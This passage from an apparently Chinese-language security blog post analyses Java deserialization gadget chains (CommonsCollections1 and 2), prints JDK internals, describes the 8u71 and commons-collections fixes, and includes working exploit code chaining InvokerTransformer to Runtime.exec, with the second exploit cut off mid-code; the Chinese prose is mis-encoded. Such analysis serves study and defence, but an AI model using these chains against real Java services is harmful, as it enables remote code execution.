class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span></span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; paramClass, Map&lt;String, Object&gt; paramMap) &#123;</span><br><span class="line">    Class[] arrayOfClass = paramClass.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!paramClass.isAnnotation() || arrayOfClass.length != <span class="number">1</span> || arrayOfClass[<span class="keyword">false</span>] != Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>); </span><br><span class="line">    <span class="keyword">this</span>.type = paramClass;</span><br><span class="line">    <span class="keyword">this</span>.memberValues = paramMap;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object paramObject, Method paramMethod, Object[] paramArrayOfObject)</span> </span>&#123;</span><br><span class="line">    String str = paramMethod.getName();</span><br><span class="line">    Class[] arrayOfClass = paramMethod.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (str.equals(<span class="string">"equals"</span>) &amp;&amp; arrayOfClass.length == <span class="number">1</span> &amp;&amp; arrayOfClass[<span class="keyword">false</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(paramArrayOfObject[<span class="number">0</span>]); </span><br><span class="line">    <span class="keyword">if</span> (arrayOfClass.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">"Too many parameters for an annotation method"</span>); </span><br><span class="line">    <span class="keyword">switch</span> (str) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"toString"</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"hashCode"</span>:</span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(hashCodeImpl());</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"annotationType"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object object = <span class="keyword">this</span>.memberValues.get(str); <span class="comment">// &lt;--- è¿™é‡Œè°ƒç”¨äº† get, è€Œä¸” memberValues ä¹Ÿæ˜¯ Map ç±»å‹, å¯ä»¥æŠŠ LazyMap æ”¾åœ¨è¿™é‡Œ</span></span><br><span class="line">    <span class="keyword">if</span> (object == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, str); </span><br><span class="line">    <span class="keyword">if</span> (object <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy)object).generateException(); </span><br><span class="line">    <span class="keyword">if</span> (object.getClass().isArray() &amp;&amp; Array.getLength(object) != <span class="number">0</span>)</span><br><span class="line">        object = cloneArray(object); </span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¥çœ‹è¿™ä¸ªç±»çš„ <code>readObject</code>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream paramObjectInputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    paramObjectInputStream.defaultReadObject();</span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException illegalArgumentException) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    Map map = annotationType.memberTypes();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry entry : <span class="keyword">this</span>.memberValues.entrySet()) &#123;</span><br><span class="line">        String str = (String)entry.getKey();</span><br><span class="line">        Class clazz = (Class)map.get(str);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object object = entry.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!clazz.isInstance(object) &amp;&amp; !(object <span class="keyword">instanceof</span> ExceptionProxy))</span><br><span class="line">                entry.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(object.getClass() + <span class="string">"["</span> + object + <span class="string">"]"</span>)).setMember((Method)annotationType.members().get(str))); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®ç‚¹åœ¨ <code>this.memberValues.entrySet()</code>, é‚£ä¹ˆé—®é¢˜æ¥äº†, è¿™é‡Œåˆè·Ÿ invoke æœ‰ä»€ä¹ˆå…³ç³»å‘¢.<br>è¿™é‡Œæ¶‰åŠåˆ° java çš„åŠ¨æ€ä»£ç†æœºåˆ¶, è¿™é‡Œä¸å†èµ˜è¿°, å¯ä»¥ç†è§£ä¸ºè°ƒç”¨è¿™ä¸ªæ–¹æ³•å®é™…ä¸Šè°ƒç”¨çš„æ˜¯ä»£ç†çš„ invoke, åœ¨ä¸Šé¢å¯ä»¥çœ‹åˆ° AnnotationInvocationHandler æœ¬èº«ç»§æ‰¿äº† InvocationHandler ä¸”é‡å†™äº† invoke æ–¹æ³•. åˆšå¥½å¯ä»¥æ‹¿æ¥åˆ©ç”¨, æ¥ä¸‹æ¥é—®é¢˜å°±å¾ˆç®€å•äº†, exp å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/rmb122_pwned_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// å› ä¸ºæ„é€ æ–¹æ³•ä¸æ˜¯ public, åªèƒ½é€šè¿‡åå°„æ„é€ å‡ºæ¥</span></span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, invo);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Deprecated.class, proxy);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é—®é¢˜æ˜¯ java æ˜¯å¦‚ä½•ä¿®å¤çš„å‘¢? ä¸€å¼€å§‹ä¸çŸ¥é“å·²ç»ä¿®å¤, å¤ç°å‡ºæ¥å¯¼è‡´è¿˜ä»¥ä¸ºè‡ªå·±å†™é”™äº† 233<br>çœ‹åˆ° </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰å‘ç°æœ‰å¯èƒ½æ˜¯ java å†…éƒ¨ç±»åŠ¨è¿‡çš„åŸå› .</p><p>æ‹¿æœ€æ–°ç‰ˆçš„ <code>readObject</code> ä¸ä¸Šé¢ u66 ç‰ˆæœ¬çš„å¯¹æ¯”ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField fields = s.readFields();</span><br><span class="line">    Class&lt;? extends Annotation&gt; t = (Class)fields.get(<span class="string">"type"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map)fields.get(<span class="string">"memberValues"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(t);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String name;</span><br><span class="line">    Object value;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = streamVals.entrySet().iterator(); var8.hasNext(); mv.put(name, value)) &#123;</span><br><span class="line">        Entry&lt;String, Object&gt; memberValue = (Entry)var8.next();</span><br><span class="line">        name = (String)memberValue.getKey();</span><br><span class="line">        value = <span class="keyword">null</span>;</span><br><span class="line">        Class&lt;?&gt; memberType = (Class)memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!memberType.isInstance(value) &amp;&amp; !(value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                value = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>)).setMember((Method)annotationType.members().get(name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, t);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„ä¸¤å¤„å˜åŒ–æ˜¯ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, t);</span><br><span class="line">AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, mv);</span><br></pre></td></tr></table></figure><p>å…¶å°†ååºåˆ—åŒ–åçš„ memberValues è®¾ä¸ºäº† mv, è€Œ mv æ˜¯  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Object&gt; mv = <span class="keyword">new</span> LinkedHashMap();</span><br></pre></td></tr></table></figure><p>ä¸æ˜¯æˆ‘ä»¬è®¾ç½®çš„ LazyMap, è¿™è‡ªç„¶å¯¼è‡´äº†åœ¨å¤–å±‚ AnnotationInvocationHandler è°ƒç”¨ proxy æ—¶, å†…å±‚çš„ AnnotationInvocationHandler çš„ memberValues æ˜¯ è¢«é‡æ–°è®¾ç½®çš„ LinkedHashMap, è€Œä¸æ˜¯æˆ‘ä»¬æ„é€ çš„ LazyMap, è‡ªç„¶å°±æ— æ³•åˆ©ç”¨äº†.</p><p>çœ‹çœ‹ java å¯¹ AnnotationInvocationHandler çš„ä¿®å¤</p><p>ysoseiral è¿™ä¸ª exp åœ¨ 2015 å¹´åˆè¢«å‘å¸ƒ<br><img src="https://i.loli.net/2020/01/21/qfzXF9TOvtIoKxb.png" alt=""></p><p>æŸ¥çœ‹ git çš„ history, å¯ä»¥çœ‹åˆ°åœ¨ 2015 å¹´ 12 æœˆè¢«ä¿®å¤<br><img src="https://i.loli.net/2020/01/21/fBmpoH35E1hgj9e.png" alt="">  </p><p>java8u71 2016 å¹´åˆå‘å¸ƒ<br><img src="https://i.loli.net/2020/01/21/RVu7qSnNl2FQBt6.png" alt="">  </p><p>å†çœ‹ commons-collections3 çš„ä¿®å¤:</p><p><img src="https://i.loli.net/2020/01/23/XgxnUcD3A1rJFGb.png" alt="">  </p><p>åœ¨ readObject, writeObject æ—¶éƒ½åšäº†æ£€æµ‹, éœ€è¦è®¾ç½®å¯¹åº”çš„ Property ä¸º true æ‰èƒ½ååºåˆ—åŒ– InvokerTransformer.  </p><p>çœ‹è¿™ä¸ªæ¼æ´çš„å†å², ä¹Ÿæ˜¯éå¸¸æœ‰è¶£çš„. </p><h2 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2><p>è¿˜æ˜¯å…ˆçœ‹è°ƒç”¨æ ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª gadget æ¯”è¾ƒç‰¹æ®Šçš„æ˜¯ç”¨äº† <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> è¿™ä¸ªå†…ç½®ç±», è¿™ä¸ªç±»çš„éªšæ“ä½œå°±æ˜¯, åœ¨è°ƒç”¨ä»–çš„ <code>newTransformer</code> æˆ–è€… <code>getOutputProperties</code> (è¿™ä¸ªæ–¹æ³•å†…éƒ¨ä¼šè°ƒç”¨ <code>newTransformer</code>) æ—¶, ä¼šåŠ¨æ€ä»å­—èŠ‚ç ä¸­é‡å»ºä¸€ä¸ªç±». è¿™å°±ä½¿å¾—å¦‚æœæˆ‘ä»¬èƒ½æ“ä½œå­—èŠ‚ç , å°±èƒ½åœ¨åˆ›å»ºç±»æ—¶æ‰§ä»»æ„ java ä»£ç .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    TransformerImpl transformer = <span class="keyword">new</span> TransformerImpl(<span class="keyword">this</span>.getTransletInstance(), <span class="keyword">this</span>._outputProperties, <span class="keyword">this</span>._indentNumber, <span class="keyword">this</span>._tfactory);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(<span class="keyword">this</span>._uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._tfactory.getFeature(<span class="string">"http://javax.xml.XMLConstants/feature/secure-processing"</span>)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._name == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._class == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.defineTransletClasses(); <span class="comment">// è¿™ä¸ªæ–¹æ³•é‡Œé¢è°ƒç”¨äº† ClassLoader åŠ è½½ bytecode</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//... çœç•¥</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨è¿™ä¸ª gadget ä¸­, æ²¡æœ‰ä½¿ç”¨ä¹‹å‰çš„ LazyMap, è€Œæ˜¯ä½¿ç”¨çš„æ˜¯ PriorityQueue + TransformingComparator è¿™å¥—ç»„åˆæ‹³.<br>ä¸è¿‡è¿™ä¸ª exp åªå¯¹ CommonsCollections4 æœ‰æ•ˆ, åœ¨ 3 ä¸­ TransformingComparator æ²¡æœ‰ implements Serializable, å¯¼è‡´æ— æ³•åºåˆ—åŒ–.  </p><p>java.util.PriorityQueue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    s.readInt();</span><br><span class="line">    SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Object[].class, <span class="keyword">this</span>.size);</span><br><span class="line">    Object[] es = <span class="keyword">this</span>.queue = <span class="keyword">new</span> Object[Math.max(<span class="keyword">this</span>.size, <span class="number">1</span>)];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> n = <span class="keyword">this</span>.size; i &lt; n; ++i) &#123;</span><br><span class="line">        es[i] = s.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PriorityQueue readObject æ—¶, åœ¨è¯»å–å®Œå¯¹è±¡å, ä¼šè°ƒç”¨ heapify æ¥è¿›è¡Œæ’åº, è€Œæ’åºæ–¹æ³•æ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ (åˆ©ç”¨ Comparator æ¥å£), é…åˆä¸Š TransformingComparator.  </p><p>org.apache.commons.collections4.comparators.TransformingComparator (å®ç°äº† Comparator æ¥å£)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ’åºæ—¶ä¼šå…ˆ transform ä¸€ä¸‹, å†ç»“åˆå–œé—»ä¹è§çš„ InvokeTransfer, å¯¼è‡´ RCE.</p><p>æœ€å exp å¦‚ä¸‹: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Placeholder.class));</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));</span><br><span class="line"></span><br><span class="line">        CtClass placeholder = classPool.get(Placeholder.class.getName());</span><br><span class="line">        